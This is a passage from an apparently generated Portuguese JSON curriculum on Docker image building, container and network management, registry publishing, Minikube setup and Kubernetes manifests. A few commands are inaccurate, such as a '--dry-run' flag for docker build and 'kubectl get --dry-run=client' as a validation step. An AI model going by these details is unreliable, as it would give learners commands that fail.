                              "realWorldApplication": "Dockerfiles são essenciais em pipelines de deploy contínuo, permitindo empacotar apps web para orquestradores como Kubernetes em clouds (AWS, Azure), garantindo consistência entre dev, staging e produção, reduzindo 'it works on my machine'."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.2",
                            "name": "Construir e testar imagens Docker",
                            "description": "Utilizar comandos docker build para criar imagens a partir de Dockerfile, testar localmente com docker run e verificar logs e inspeção de containers.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e criar o Dockerfile",
                                  "subSteps": [
                                    "Instale o Docker no seu sistema operacional seguindo a documentação oficial.",
                                    "Crie um novo diretório para o projeto e navegue até ele.",
                                    "Crie um arquivo simples de aplicação, como um index.html com 'Hello World' ou um app Node.js básico.",
                                    "Escreva um Dockerfile básico: FROM node:alpine (ou nginx), COPY ., WORKDIR /app, RUN npm install (se aplicável), CMD ou ENTRYPOINT.",
                                    "Verifique a sintaxe do Dockerfile com docker build --no-cache --dry-run ."
                                  ],
                                  "verification": "Execute 'docker --version' e 'cat Dockerfile' para confirmar instalação e conteúdo correto.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Docker Desktop ou Docker Engine instalado",
                                    "Editor de texto (VS Code recomendado)",
                                    "Terminal/Command Prompt"
                                  ],
                                  "tips": [
                                    "Use imagens base leves como alpine para reduzir tamanho.",
                                    "Estruture o diretório: app files no root do build context."
                                  ],
                                  "learningObjective": "Entender a estrutura essencial de um Dockerfile e preparar um contexto de build válido.",
                                  "commonMistakes": [
                                    "Esquecer de instalar Docker ou usar versão desatualizada.",
                                    "Erros de sintaxe no Dockerfile como indentação incorreta.",
                                    "Incluir arquivos desnecessários no build context (use .dockerignore)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir a imagem Docker",
                                  "subSteps": [
                                    "No diretório do projeto, execute 'docker build -t minha-imagem:v1 .' para construir a imagem.",
                                    "Monitore o output para camadas sendo construídas e possíveis erros de cache.",
                                    "Use '--no-cache' se precisar rebuildar tudo.",
                                    "Verifique a imagem criada com 'docker images' e confirme o tamanho e tags.",
                                    "Teste o build múltiplas vezes ajustando o Dockerfile para otimizar."
                                  ],
                                  "verification": "Lista de imagens mostra 'minha-imagem:v1' com status 'Created' e sem erros no build log.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Dockerfile pronto",
                                    "Arquivos da aplicação",
                                    "Terminal com Docker rodando"
                                  ],
                                  "tips": [
                                    "Adicione .dockerignore para excluir node_modules, .git, etc.",
                                    "Use multi-stage builds para produção."
                                  ],
                                  "learningObjective": "Dominar o comando docker build e entender camadas de imagem.",
                                  "commonMistakes": [
                                    "Pontos no comando errado (deve ser '.' para current directory).",
                                    "Nome de tag inválido ou duplicado.",
                                    "Build falha por dependências não copiadas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar e testar o container localmente",
                                  "subSteps": [
                                    "Execute 'docker run -d -p 8080:80 minha-imagem:v1' (ajuste portas conforme app).",
                                    "Verifique se o container está rodando com 'docker ps'.",
                                    "Acesse localhost:8080 no browser para testar a aplicação.",
                                    "Pare o container com 'docker stop <container_id>' e remova com 'docker rm <id>'.",
                                    "Repita com parâmetros como --name, -e para env vars."
                                  ],
                                  "verification": "Aplicação acessível via browser e 'docker ps' mostra container UP.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Imagem construída",
                                    "Browser web",
                                    "Terminal"
                                  ],
                                  "tips": [
                                    "-d para detached mode, -p para port mapping.",
                                    "Use --rm para auto-remove ao parar."
                                  ],
                                  "learningObjective": "Executar containers de forma isolada e mapear portas corretamente.",
                                  "commonMistakes": [
                                    "Portas conflitantes ou não mapeadas.",
                                    "CMD/ENTRYPOINT errado no Dockerfile causando crash.",
                                    "Container sai imediatamente (ver logs)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar logs e inspecionar o container",
                                  "subSteps": [
                                    "Execute um container e obtenha ID com 'docker ps'.",
                                    "Veja logs com 'docker logs <container_id>' ou 'docker logs -f' para follow.",
                                    "Inspecione metadados com 'docker inspect <container_id>' e analise JSON output.",
                                    "Use 'docker stats <id>' para métricas de runtime.",
                                    "Debug erros comuns comparando inspect com expectativas."
                                  ],
                                  "verification": "Logs mostram startup sem erros e inspect confirma env, ports, image usada.",
                                  "estimatedTime": "10-20 minutos",
                                  "materials": [
                                    "Container rodando",
                                    "Ferramenta jq para parsear JSON do inspect (opcional)"
                                  ],
                                  "tips": [
                                    "Combine com docker exec para shell interativo.",
                                    "Salve output de inspect em arquivo para análise."
                                  ],
                                  "learningObjective": "Diagnosticar problemas usando logs e inspect para troubleshooting.",
                                  "commonMistakes": [
                                    "Não usar -f em logs para real-time.",
                                    "Ignorar campos como 'State' ou 'NetworkSettings' no inspect.",
                                    "Container parado, logs vazios."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um Dockerfile para um servidor Node.js simples que roda 'npm start' expondo na porta 3000. Build com 'docker build -t node-app .', run com 'docker run -p 3000:3000 node-app', acesse localhost:3000, cheque logs e inspect.",
                              "finalVerifications": [
                                "Imagem construída com sucesso e listada em 'docker images'.",
                                "Container roda sem crash e app é acessível via localhost.",
                                "Logs mostram aplicação iniciada corretamente.",
                                "docker inspect revela configurações corretas (ports, env, volumes).",
                                "Capacidade de rebuild e rerun com mudanças no Dockerfile.",
                                "Limpeza: docker rmi e docker rm sem erros."
                              ],
                              "assessmentCriteria": [
                                "Dockerfile sintaticamente correto e otimizado.",
                                "Build completa sem warnings/erros em <5 minutos.",
                                "Container funcional com portas mapeadas e acessível.",
                                "Análise precisa de logs e inspect para debug.",
                                "Uso de best practices como .dockerignore e tags versionadas.",
                                "Tempo total de ciclo build-run-test <10 minutos."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento de Software: Integração com CI/CD pipelines (GitHub Actions, Jenkins).",
                                "Administração de Sistemas: Gerenciamento de clusters com Docker Swarm/Kubernetes.",
                                "Cloud Computing: Deploy em AWS ECS, Google Cloud Run ou Azure Container Instances.",
                                "Segurança da Informação: Scanning de vulnerabilidades com Docker Scout ou Trivy.",
                                "Programação: Automatização de builds com scripts Makefile ou Docker Compose."
                              ],
                              "realWorldApplication": "Em equipes DevOps, desenvolvedores constroem e testam imagens Docker localmente antes de push para registries como Docker Hub ou ECR, integrando em pipelines CI/CD para deploys automatizados em produção, garantindo consistência de ambientes e reduzindo 'it works on my machine'."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.3",
                            "name": "Gerenciar containers e redes Docker",
                            "description": "Executar comandos como docker ps, docker stop, docker rm para gerenciar lifecycle de containers, configurar redes personalizadas e volumes para persistência de dados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Listar e Inspecionar Containers",
                                  "subSteps": [
                                    "Instale e verifique a instalação do Docker com 'docker --version'.",
                                    "Execute 'docker ps' para listar containers em execução.",
                                    "Execute 'docker ps -a' para listar todos os containers, incluindo parados.",
                                    "Use 'docker inspect <container_id>' para obter detalhes de um container específico.",
                                    "Pratique filtrando com 'docker ps --filter \"status=exited\"'."
                                  ],
                                  "verification": "Confirme que você pode listar containers ativos e parados corretamente e inspecionar detalhes sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Docker instalado",
                                    "Terminal de comando"
                                  ],
                                  "tips": "Use flags como -q para IDs apenas e salve saídas em arquivos para análise.",
                                  "learningObjective": "Compreender o estado atual dos containers e inspecionar configurações.",
                                  "commonMistakes": [
                                    "Esquecer a flag -a e não ver containers parados",
                                    "Digitar ID errado no inspect",
                                    "Não usar aspas em nomes com espaços"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerenciar Lifecycle de Containers",
                                  "subSteps": [
                                    "Inicie um container de teste: 'docker run -d --name meu-container nginx'.",
                                    "Pare o container: 'docker stop meu-container'.",
                                    "Reinicie: 'docker start meu-container'.",
                                    "Remova o container: 'docker rm meu-container'.",
                                    "Force remoção de container em execução: 'docker rm -f meu-container'."
                                  ],
                                  "verification": "Crie, pare, inicie e remova um container nginx sem erros, confirmando com 'docker ps -a'.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Docker instalado",
                                    "Imagem nginx (puxada automaticamente)"
                                  ],
                                  "tips": "Sempre use --name para facilitar gerenciamento; prefira stop antes de rm.",
                                  "learningObjective": "Dominar comandos para controlar o ciclo de vida completo de um container.",
                                  "commonMistakes": [
                                    "Remover container em execução sem -f",
                                    "Não usar -d para detached mode",
                                    "Conflitos de nomes de containers"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Volumes para Persistência de Dados",
                                  "subSteps": [
                                    "Crie um volume: 'docker volume create meu-volume'.",
                                    "Execute container com volume: 'docker run -d --name app-db -v meu-volume:/data mysql'.",
                                    "Gere dados no container e pare-o.",
                                    "Reinicie o container e verifique se dados persistem.",
                                    "Liste e inspecione volumes: 'docker volume ls' e 'docker volume inspect meu-volume'."
                                  ],
                                  "verification": "Dados escritos no volume sobrevivem a restart do container, confirmado via logs ou shell.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Docker instalado",
                                    "Imagem mysql:latest"
                                  ],
                                  "tips": "Use bind mounts para desenvolvimento local: -v $(pwd)/host_dir:/container_dir.",
                                  "learningObjective": "Implementar persistência de dados isolando storage do container.",
                                  "commonMistakes": [
                                    "Caminho de volume incorreto",
                                    "Esquecer de expor portas para teste",
                                    "Não commit dados antes de restart"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar e Gerenciar Redes Docker Personalizadas",
                                  "subSteps": [
                                    "Crie uma rede: 'docker network create minha-rede'.",
                                    "Execute containers na rede: 'docker run -d --name web --network minha-rede nginx' e similar para db.",
                                    "Teste conectividade: 'docker exec web ping db'.",
                                    "Inspecione rede: 'docker network inspect minha-rede'.",
                                    "Remova rede após parar containers: 'docker network rm minha-rede'."
                                  ],
                                  "verification": "Containers na mesma rede se comunicam por nome, confirmado com ping ou curl.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Docker instalado",
                                    "Imagens nginx e redis-alpine"
                                  ],
                                  "tips": "Use --network=host apenas para debug; prefira user-defined networks para isolamento.",
                                  "learningObjective": "Criar redes isoladas para comunicação segura entre containers.",
                                  "commonMistakes": [
                                    "Remover rede com containers ativos",
                                    "Usar rede default bridge desnecessariamente",
                                    "Nomes de containers não resolvidos por DNS"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma stack simples: container Nginx (web) acessando MySQL (db) via rede custom 'app-net', com volume persistindo dados do banco. Execute 'docker run -d --name web --network app-net -p 80:80 nginx' e 'docker run -d --name db --network app-net -v db-data:/var/lib/mysql mysql', teste acesso via browser e curl web-to-db.",
                              "finalVerifications": [
                                "Listar todos containers e redes com ps -a e network ls.",
                                "Parar/remover containers e volumes sem perda de dados persistidos.",
                                "Verificar conectividade entre dois containers em rede custom via ping/nslookup.",
                                "Inspecionar um volume e rede para confirmar mounts e IPs.",
                                "Limpar ambiente completamente: docker rm -f, volume rm, network rm.",
                                "Executar stack completa sem erros de porta ou conexão."
                              ],
                              "assessmentCriteria": [
                                "Execução precisa de comandos sem sintaxe erros.",
                                "Compreensão demonstrada via inspeções e verificações manuais.",
                                "Persistência de dados validada pós-restart.",
                                "Conectividade de rede testada com ferramentas internas (ping/curl).",
                                "Limpeza completa do ambiente sem resíduos.",
                                "Tempo de execução dentro dos estimados com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Conceitos de subnetting e DNS resolution em redes overlay.",
                                "Banco de Dados: Persistência e configuração de storage em ambientes containerizados.",
                                "Desenvolvimento de Software: Integração em pipelines CI/CD com Docker Compose.",
                                "Segurança da Informação: Isolamento via networks para mitigar ataques laterais.",
                                "Administração de Sistemas: Gerenciamento de recursos em clusters Kubernetes."
                              ],
                              "realWorldApplication": "Em DevOps, gerenciar containers e redes Docker é essencial para deploy de microservices em produção, como em Kubernetes, garantindo escalabilidade, isolamento de falhas e persistência em clouds como AWS ECS ou Google Kubernetes Engine."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.4",
                            "name": "Publicar imagens em repositórios Docker",
                            "description": "Fazer login no Docker Hub ou registry privado, taggear imagens e utilizar docker push para disponibilizar imagens para deploys em nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar autenticação no Docker Hub ou registry privado",
                                  "subSteps": [
                                    "Crie uma conta no Docker Hub se não tiver (ou use credenciais de registry privado).",
                                    "Execute 'docker login' no terminal e insira username e password ou token.",
                                    "Verifique o login com 'docker login --help' ou testando listagem de repositórios.",
                                    "Para registry privado, especifique a URL: 'docker login seu-registry.com'.",
                                    "Salve credenciais com segurança usando Docker Config JSON."
                                  ],
                                  "verification": "Comando 'docker info' mostra 'Logged in to Docker Hub' ou registry equivalente sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Docker instalado",
                                    "Conta no Docker Hub ou registry privado",
                                    "Terminal/CLI"
                                  ],
                                  "tips": "Use tokens de acesso pessoal em vez de senhas para maior segurança.",
                                  "learningObjective": "Entender e configurar autenticação segura para registries Docker.",
                                  "commonMistakes": [
                                    "Senha incorreta causando 'unauthorized'",
                                    "Esquecer de especificar registry privado",
                                    "Não usar token em ambientes CI/CD"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e preparar a imagem local para publicação",
                                  "subSteps": [
                                    "Liste imagens locais com 'docker images'.",
                                    "Identifique a imagem alvo (ex: minha-app:latest).",
                                    "Teste a imagem localmente com 'docker run' para garantir que funciona.",
                                    "Remova tags antigas desnecessárias com 'docker rmi image:tag'.",
                                    "Garanta que a imagem foi buildada com Dockerfile otimizado."
                                  ],
                                  "verification": "Imagem listada corretamente e roda sem erros via 'docker run'.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Imagem Docker local buildada",
                                    "Dockerfile de referência"
                                  ],
                                  "tips": "Sempre teste localmente antes de push para evitar erros públicos.",
                                  "learningObjective": "Preparar imagens locais de forma eficiente para upload.",
                                  "commonMistakes": [
                                    "Push de imagens não testadas",
                                    "Confundir IMAGE ID com REPOSITORY",
                                    "Imagens muito grandes sem otimização"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Taggear a imagem corretamente para o registry",
                                  "subSteps": [
                                    "Determine o formato: 'seuusername/nome-imagem:tag' para Docker Hub.",
                                    "Execute 'docker tag imagem-local seuusername/nome-imagem:tag'.",
                                    "Crie múltiplas tags se necessário (ex: latest, v1.0).",
                                    "Verifique com 'docker images' que nova tag aparece.",
                                    "Para registry privado: 'docker tag imagem-local registry.com/repo:tag'."
                                  ],
                                  "verification": "Nova imagem tagueada listada em 'docker images' com REPOSITORY correto.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Imagem local identificada",
                                    "Nome de usuário no registry"
                                  ],
                                  "tips": "Use tags semânticas (semver) como v1.2.3 para versionamento claro.",
                                  "learningObjective": "Dominar o tagging para compatibilidade com registries remotos.",
                                  "commonMistakes": [
                                    "Tag sem username/repo causando push local",
                                    "Erro de digitação no nome",
                                    "Taggear imagem errada"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Publicar a imagem usando docker push",
                                  "subSteps": [
                                    "Execute 'docker push seuusername/nome-imagem:tag'.",
                                    "Monitore progresso (layers sendo enviados).",
                                    "Aguarde 'latest: digest: sha256:... successfully pushed'.",
                                    "Repita para múltiplas tags se aplicável.",
                                    "Lide com erros de rede retrying o comando."
                                  ],
                                  "verification": "Log final confirma 'successfully pushed' sem erros de autenticação ou quota.",
                                  "estimatedTime": "20 minutos (depende do tamanho)",
                                  "materials": [
                                    "Imagem tagueada",
                                    "Conexão estável à internet"
                                  ],
                                  "tips": "Use '--quiet' para output limpo em scripts automatizados.",
                                  "learningObjective": "Executar push seguro e monitorar o processo de upload.",
                                  "commonMistakes": [
                                    "Push sem login",
                                    "Exceder limites gratuitos do Docker Hub",
                                    "Interromper push causando corrupção"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e validar a publicação no registry",
                                  "subSteps": [
                                    "Acesse o Docker Hub web e busque seu repositório.",
                                    "Teste pull de outra máquina/terminal: 'docker pull seuusername/nome-imagem:tag'.",
                                    "Inspecione com 'docker inspect' após pull.",
                                    "Verifique logs de push no Docker Hub dashboard.",
                                    "Confirme digest SHA256 para integridade."
                                  ],
                                  "verification": "Imagem pullable e executável de qualquer lugar autenticado.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Acesso web ao Docker Hub",
                                    "Segunda instância Docker para pull"
                                  ],
                                  "tips": "Automatize verificações em pipelines CI/CD com scripts.",
                                  "learningObjective": "Validar disponibilidade e integridade de imagens publicadas.",
                                  "commonMistakes": [
                                    "Não testar pull",
                                    "Confundir public vs private repo",
                                    "Ignorar warnings de vulnerabilidades"
                                  ]
                                }
                              ],
                              "practicalExample": "Construa uma imagem simples de um app Node.js (ex: 'docker build -t minha-app .'), faça login no Docker Hub, tagge como 'seuuser/minha-app:v1', push e verifique pull de outra máquina para deploy em Kubernetes.",
                              "finalVerifications": [
                                "Imagem aparece no dashboard do Docker Hub/registry com tags corretas.",
                                "docker pull funciona de máquina não autenticada (para repositórios públicos).",
                                "docker run após pull executa sem erros.",
                                "Digest SHA256 corresponde entre push e pull.",
                                "Nenhum erro de autenticação ou quota no histórico.",
                                "Tamanho da imagem otimizado (<500MB ideal)."
                              ],
                              "assessmentCriteria": [
                                "Autenticação bem-sucedida sem prompts repetidos.",
                                "Tags no formato correto (user/repo:tag).",
                                "Push completa com logs de sucesso para todas layers.",
                                "Verificação de pull e run em ambiente isolado.",
                                "Documentação de comandos executados e saídas.",
                                "Tratamento de erros comuns demonstrado."
                              ],
                              "crossCurricularConnections": [
                                "Integração com CI/CD (Jenkins/GitHub Actions para automação de pushes).",
                                "Segurança em containers (scan com Trivy antes de push).",
                                "Orquestração em nuvem (Kubernetes pull de registries para deployments).",
                                "Gerenciamento de infraestrutura como código (Terraform para registries privados).",
                                "Versionamento de software (Git + Docker tags semânticos)."
                              ],
                              "realWorldApplication": "Em equipes DevOps, publicar imagens em registries como Docker Hub ou AWS ECR permite deploys consistentes, compartilhamento entre devs e orquestração automatizada em clouds como AWS, GCP ou Azure, reduzindo tempo de setup e erros de ambiente."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.4.2",
                        "name": "Orquestração com Kubernetes",
                        "description": "Princípios de orquestração de containers em cluster utilizando Kubernetes, abrangendo pods, deployments, services e configurações para escalabilidade e alta disponibilidade.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.2.1",
                            "name": "Instalar e configurar Minikube",
                            "description": "Configurar um cluster Kubernetes local com Minikube, utilizando kubectl para interagir e verificar o status do cluster.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente do sistema",
                                  "subSteps": [
                                    "Verifique se o sistema operacional é compatível (Linux, macOS ou Windows com WSL2).",
                                    "Instale o Docker Desktop ou equivalente, garantindo que esteja rodando.",
                                    "Baixe e instale o kubectl da versão mais recente compatível com Kubernetes.",
                                    "Configure o PATH do sistema para incluir os binários do kubectl e Docker.",
                                    "Teste a instalação executando 'docker --version' e 'kubectl version --client'."
                                  ],
                                  "verification": "Execute 'docker --version' e 'kubectl version --client' sem erros e confirme versões atualizadas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Docker Desktop",
                                    "kubectl binary",
                                    "Terminal ou PowerShell"
                                  ],
                                  "tips": "Use gerenciadores de pacotes como Homebrew (macOS/Linux) ou Chocolatey (Windows) para instalações rápidas.",
                                  "learningObjective": "Entender e configurar pré-requisitos essenciais para rodar Minikube.",
                                  "commonMistakes": [
                                    "Não ativar virtualização no BIOS/UEFI",
                                    "Usar versão incompatível de Docker",
                                    "Esquecer de reiniciar o terminal após adicionar ao PATH"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar o Minikube",
                                  "subSteps": [
                                    "Acesse o site oficial do Minikube e baixe o instalador para seu SO.",
                                    "Execute o instalador ou torne o binário executável com 'chmod +x minikube'.",
                                    "Mova o binário para um diretório no PATH, como /usr/local/bin.",
                                    "Verifique a instalação com 'minikube version'.",
                                    "Opcionalmente, configure drivers como 'docker' ou 'virtualbox' via minikube config."
                                  ],
                                  "verification": "'minikube version' retorna a versão instalada sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Instalador Minikube do GitHub",
                                    "Driver de virtualização (Docker ou VirtualBox)"
                                  ],
                                  "tips": "Prefira o driver 'docker' se já tiver Docker instalado para simplicidade.",
                                  "learningObjective": "Realizar a instalação correta do Minikube e suas configurações iniciais.",
                                  "commonMistakes": [
                                    "Baixar versão errada para o SO",
                                    "Não adicionar ao PATH",
                                    "Ignorar requisitos de driver"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Iniciar o cluster Minikube",
                                  "subSteps": [
                                    "Execute 'minikube start --driver=docker' (ajuste o driver conforme necessário).",
                                    "Aguarde a criação do cluster e configuração do kubectl automaticamente.",
                                    "Monitore o progresso com 'minikube status' durante o start.",
                                    "Habilite addons úteis como 'dashboard' com 'minikube addons enable dashboard'.",
                                    "Acesse o dashboard via 'minikube dashboard' para visualização inicial."
                                  ],
                                  "verification": "'minikube status' mostra host, kubelet e apiserver como 'Running'.",
                                  "estimatedTime": "10-20 minutos (depende da máquina)",
                                  "materials": [
                                    "Máquina com pelo menos 2GB RAM livre",
                                    "Conexão à internet para download de imagens"
                                  ],
                                  "tips": "Use '--cpus=2 --memory=4096mb' para clusters maiores em testes.",
                                  "learningObjective": "Iniciar e configurar um cluster Kubernetes local funcional.",
                                  "commonMistakes": [
                                    "Pouca memória alocada causando falhas",
                                    "Firewall bloqueando portas",
                                    "Driver incompatível com SO"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e interagir com o cluster usando kubectl",
                                  "subSteps": [
                                    "Execute 'kubectl get nodes' para listar nós do cluster.",
                                    "Crie um deployment simples: 'kubectl create deployment hello-minikube --image=echoserver:1.4'.",
                                    "Exponha o serviço: 'kubectl expose deployment hello-minikube --type=NodePort --port=8080'.",
                                    "Acesse o serviço via 'minikube service hello-minikube'.",
                                    "Limpe recursos: 'kubectl delete deployment hello-minikube'."
                                  ],
                                  "verification": "'kubectl get nodes' mostra 1 nó Ready e o serviço acessível via URL do Minikube.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "kubectl configurado",
                                    "Navegador web"
                                  ],
                                  "tips": "Use 'kubectl cluster-info' para dump de status completo.",
                                  "learningObjective": "Usar kubectl para interagir, verificar e gerenciar o cluster Minikube.",
                                  "commonMistakes": [
                                    "kubectl apontando para cluster errado",
                                    "Portas em conflito",
                                    "Não usar minikube service para acesso"
                                  ]
                                }
                              ],
                              "practicalExample": "Após configuração, crie um deployment de um Nginx pod com 'kubectl run nginx --image=nginx', exponha com 'kubectl expose pod nginx --port=80 --type=NodePort', acesse via 'minikube service nginx' e verifique logs com 'kubectl logs <pod-name>'.",
                              "finalVerifications": [
                                "minikube status mostra todos componentes Running.",
                                "kubectl get nodes lista 1 nó com status Ready.",
                                "kubectl cluster-info dump não apresenta erros.",
                                "Dashboard acessível via minikube dashboard.",
                                "Um pod de teste é criado, listado e deletado sem erros.",
                                "minikube ip retorna IP válido do cluster."
                              ],
                              "assessmentCriteria": [
                                "Cluster inicia sem erros em menos de 5 minutos.",
                                "kubectl comandos executam corretamente contra o cluster local.",
                                "Recursos como deployments e services são gerenciados adequadamente.",
                                "Verificações de status confirmam cluster saudável.",
                                "Aluno explica passos e troubleshooting comum.",
                                "Ambiente é limpo corretamente com 'minikube delete'."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender portas NodePort e serviços Kubernetes.",
                                "Desenvolvimento de Software: Integração com CI/CD pipelines locais.",
                                "Administração de Sistemas: Gerenciamento de contêineres e virtualização.",
                                "Cloud Computing: Simulação de ambientes AWS EKS ou GKE.",
                                "Programação: Uso de YAML para definições de recursos kubectl."
                              ],
                              "realWorldApplication": "Desenvolvedores usam Minikube para testar deploys Kubernetes localmente antes de produção, economizando custos em clouds e acelerando iterações em equipes DevOps."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.2.2",
                            "name": "Criar e gerenciar Pods e Deployments",
                            "description": "Definir manifests YAML para pods simples e deployments com réplicas, aplicar com kubectl apply e monitorar com kubectl get e describe.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar manifest YAML para um Pod simples",
                                  "subSteps": [
                                    "Instale e configure um cluster Kubernetes local (ex: Minikube).",
                                    "Abra um editor de texto e crie um arquivo pod.yaml.",
                                    "Defina a seção apiVersion: v1 e kind: Pod.",
                                    "Adicione metadata com name: meu-pod.",
                                    "Especifique spec com containers: array contendo name: minha-app, image: nginx:latest e ports: [{containerPort: 80}].",
                                    "Salve o arquivo e valide a sintaxe YAML com kubectl apply --dry-run=client -f pod.yaml."
                                  ],
                                  "verification": "Execute 'kubectl get pod meu-pod --dry-run=client' para verificar se o YAML é válido sem criar o recurso.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Cluster Kubernetes (Minikube ou Kind)",
                                    "kubectl instalado",
                                    "Editor de texto (VS Code com YAML extension)"
                                  ],
                                  "tips": "Use indentação consistente de 2 espaços no YAML para evitar erros de parsing.",
                                  "learningObjective": "Entender a estrutura básica de um Pod manifest e criar um YAML funcional.",
                                  "commonMistakes": [
                                    "Esquecer a indentação correta",
                                    "Usar image inexistente",
                                    "Omitir containerPort"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar manifest YAML para um Deployment com réplicas",
                                  "subSteps": [
                                    "Crie um arquivo deployment.yaml.",
                                    "Defina apiVersion: apps/v1 e kind: Deployment.",
                                    "Adicione metadata com name: meu-deployment.",
                                    "No spec, defina replicas: 3, selector: {matchLabels: {app: minha-app}}, e template com metadata.labels.app: minha-app.",
                                    "No template.spec.containers, repita a configuração do Pod (nginx:latest, port 80).",
                                    "Valide com kubectl apply --dry-run=client -f deployment.yaml."
                                  ],
                                  "verification": "Execute 'kubectl get deployment meu-deployment --dry-run=client' para checar validade.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Mesmo cluster e ferramentas do Step 1"
                                  ],
                                  "tips": "Garanta que labels no selector combinem com os no template para evitar falhas de matching.",
                                  "learningObjective": "Dominar a estrutura de Deployment, incluindo réplicas e template de Pod.",
                                  "commonMistakes": [
                                    "Mismatch entre selector e labels do template",
                                    "Esquecer replicas",
                                    "apiVersion incorreto para Deployment"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar manifests com kubectl apply",
                                  "subSteps": [
                                    "Execute 'kubectl apply -f pod.yaml' para criar o Pod.",
                                    "Execute 'kubectl apply -f deployment.yaml' para criar o Deployment.",
                                    "Verifique status inicial com 'kubectl get pods' e 'kubectl get deployments'.",
                                    "Delete o Pod manualmente com 'kubectl delete pod meu-pod' para observar recriação pelo Deployment.",
                                    "Aguarde rollout com 'kubectl rollout status deployment/meu-deployment'."
                                  ],
                                  "verification": "Confirme que Pods estão no status Running com 'kubectl get pods'.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "kubectl",
                                    "Arquivos YAML criados"
                                  ],
                                  "tips": "Use -f para arquivos locais; --dry-run para testes sem aplicação.",
                                  "learningObjective": "Aplicar e gerenciar recursos Kubernetes de forma idempotente.",
                                  "commonMistakes": [
                                    "Usar kubectl create em vez de apply (não idempotente)",
                                    "Namespace errado",
                                    "Permissões insuficientes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitorar e gerenciar com kubectl get e describe",
                                  "subSteps": [
                                    "Liste recursos: 'kubectl get pods,deployments'.",
                                    "Descreva detalhes: 'kubectl describe pod <nome-pod>' e 'kubectl describe deployment meu-deployment'.",
                                    "Escala o Deployment: 'kubectl scale deployment meu-deployment --replicas=5'.",
                                    "Monitore logs: 'kubectl logs <nome-pod>'.",
                                    "Limpe: 'kubectl delete -f deployment.yaml' e 'kubectl delete -f pod.yaml'."
                                  ],
                                  "verification": "Verifique mudanças de réplicas com 'kubectl get deployments' e detalhes sem erros em describe.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "kubectl"
                                  ],
                                  "tips": "Use -o wide para mais detalhes em get, e --namespace=default se necessário.",
                                  "learningObjective": "Usar comandos de observabilidade para troubleshooting e gerenciamento.",
                                  "commonMistakes": [
                                    "Não especificar nome exato",
                                    "Ignorar eventos em describe",
                                    "Esquecer de limpar recursos"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um Deployment de 3 réplicas de uma aplicação web Nginx exposta na porta 80. Aplique os manifests, escale para 5 réplicas durante pico de tráfego simulado, e monitore logs para verificar health checks.",
                              "finalVerifications": [
                                "Pod simples criado e em status Running.",
